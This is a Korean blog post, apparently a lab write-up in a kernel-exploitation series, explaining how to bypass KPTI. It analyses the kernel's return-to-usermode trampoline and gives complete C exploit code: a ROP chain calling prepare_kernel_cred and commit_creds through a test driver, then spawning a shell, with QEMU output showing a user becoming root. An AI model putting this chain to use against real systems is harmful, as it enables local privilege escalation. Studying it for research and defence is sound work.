<h3 id="가젯-구성-2"><a href="#가젯-구성-2" class="headerlink" title="가젯 구성(2)"></a>가젯 구성(2)</h3><pre><code>$ cat /proc/kallsyms | grep swapgs_restore_regs_and_return_to_usermode
ffffffff81c00df0 T swapgs_restore_regs_and_return_to_usermode
</code></pre>
</br>

<pre><code>0xffffffff81c00e06:    mov    rdi,rsp
0xffffffff81c00e09:    mov    rsp,QWORD PTR gs:0x6004
0xffffffff81c00e12:    push   QWORD PTR [rdi+0x30]
0xffffffff81c00e15:    push   QWORD PTR [rdi+0x28]
0xffffffff81c00e18:    push   QWORD PTR [rdi+0x20]
0xffffffff81c00e1b:    push   QWORD PTR [rdi+0x18]
0xffffffff81c00e1e:    push   QWORD PTR [rdi+0x10]
0xffffffff81c00e21:    push   QWORD PTR [rdi]
0xffffffff81c00e23:    push   rax
0xffffffff81c00e24:    xchg   ax,ax
0xffffffff81c00e26:    mov    rdi,cr3
0xffffffff81c00e29:    jmp    0xffffffff81c00e5f
---
0xffffffff81c00e5f:    or     rdi,0x1000
0xffffffff81c00e66:    mov    cr3,rdi
0xffffffff81c00e69:    pop    rax
0xffffffff81c00e6a:    pop    rdi
0xffffffff81c00e6b:    swapgs 
0xffffffff81c00e6e:    jmp    0xffffffff81c00e90
---
0xffffffff81c00e90:    test   BYTE PTR [rsp+0x20],0x4
0xffffffff81c00e95:    jne    0xffffffff81c00e99
0xffffffff81c00e97:    iretq 
</code></pre>
</br>

<p>분석을 위해서 해당 함수를 토대로 라인별로 분석을 해보았다. 분석 과정에서 유의미하지 않은 코드를 고려하여 ROP Payload를 구성하게 될 경우 페이로드의 크기가 너무 커질 수 있기 때문에 정말 유의미한 형태가 무엇인가 고려를 해보며 이를 손수 디버깅해본 결과 다음의 결과를 얻었다.</p>
<p>실제로 유의미한 형태는 or rdi, 0x1000을 통해 페이지 테이블을 분리하여 swapgs와 iretq가 수행됨에 있다. 또한 0xffffffff81c00e06 부터 수행이 이루어져야 정상적으로 동작하는 것을 확인할 수 있었다.</p>
<p>해당 코드를 확인해보면 pop rax, pop rdi와 같은 명령어가 위치하고 있으며 다음과 같은 코드로 인해서 추가적으로 페이로드의 dummy 값을 삽입해야 한다.</p>
</br>

<h3 id="공격코드-2"><a href="#공격코드-2" class="headerlink" title="공격코드(2)"></a>공격코드(2)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>struct register_val &#123;<br>    uint64_t user_rip;<br>    uint64_t user_cs;<br>    uint64_t user_rflags;<br>    uint64_t user_rsp;<br>    uint64_t user_ss;<br>&#125; __attribute__((packed));<br><br>struct register_val rv;<br><br>void backup_rv(void) &#123;<br>    asm(&quot;mov rv+8, cs;&quot;<br>        &quot;pushf; pop rv+16;&quot;<br>        &quot;mov rv+24, rsp;&quot;<br>        &quot;mov rv+32, ss;&quot;<br>       );<br>&#125;<br><br>void shell() &#123;<br>    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);<br>&#125;<br><br>int main() &#123;<br>    int fd;<br>    size_t rop[20] = &#123;0, &#125;;<br>    <br>    void *commit_creds = 0xffffffff8108e9f0;<br>    void *prepare_kernel_cred = 0xffffffff8108ec20;<br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    backup_rv();<br><br>    memset(rop, 0x41, 40);<br>    rop[4] = 0xffffffff813fb9bc;    // pop rdi; ret;<br>    rop[5] = 0;<br>    rop[6] = prepare_kernel_cred;<br>    rop[7] = 0xffffffff813f4eca;    // pop rcx; ret;<br>    rop[8] = 0;<br>    rop[9] = 0xffffffff81b2413b;    // mov rdi, rax; rep movs ...; ret;<br>    rop[10] = commit_creds; <br>    rop[11] = 0xffffffff81c00e06;   // swapgs_restore...;<br>    rop[12] = 0x0;<br>    rop[13] = 0x0;<br>    rop[14] = &amp;shell;<br>    rop[15] = rv.user_cs;<br>    rop[16] = rv.user_rflags;<br>    rop[17] = rv.user_rsp;<br>    rop[18] = rv.user_ss;<br><br>    write(fd, rop, sizeof(rop));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="공격결과-2"><a href="#공격결과-2" class="headerlink" title="공격결과(2)"></a>공격결과(2)</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]
/ $ whoami
user
/ $ ./exploit 
/ # whoami
root
</code></pre>
<p></br></br></p>
<h2 id="참고"><a href="#참고" class="headerlink" title="참고"></a>참고</h2><pre><code>b30w0lf님의 운영체제(Operating System)
DREAMHACK - Linux Kernel Exploit
INFLEARN - 리눅스 커널 해킹. A부터 Z까지
https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2
https://www.lazenca.net/pages/viewpage.action?pageId=25624859
https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame
</code></pre>
<p></br></br></p>
<h2 id="한줄평"><a href="#한줄평" class="headerlink" title="한줄평"></a>한줄평</h2><pre><code>KPTI가 적용되어 있을 경우 단순히 유저모드로의 전환이 아닌 페이지 테이블 또한 변경해주어야 한다!
</code></pre>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/Research/">Research</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/exploit/">exploit</a>
                    
                      <a class="hover-with-bg" href="/tags/linux/">linux</a>
                    
                      <a class="hover-with-bg" href="/tags/kernel/">kernel</a>
                    
                      <a class="hover-with-bg" href="/tags/mitigation/">mitigation</a>
                    
                      <a class="hover-with-bg" href="/tags/kpti/">kpti</a>
                    
                      <a class="hover-with-bg" href="/tags/meltdown/">meltdown</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/11/01/linux-kernel-exploit-stack-pivoting/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">[Research] Linux Kernel Exploit - Stack Pivoting</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/10/04/linux-kernel-exploit-kpti/">
                        <span class="hidden-mobile">[Research] Linux Kernel Exploit - KPTI(1)</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>



  <script  src="/js/local-search.js" ></script>






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
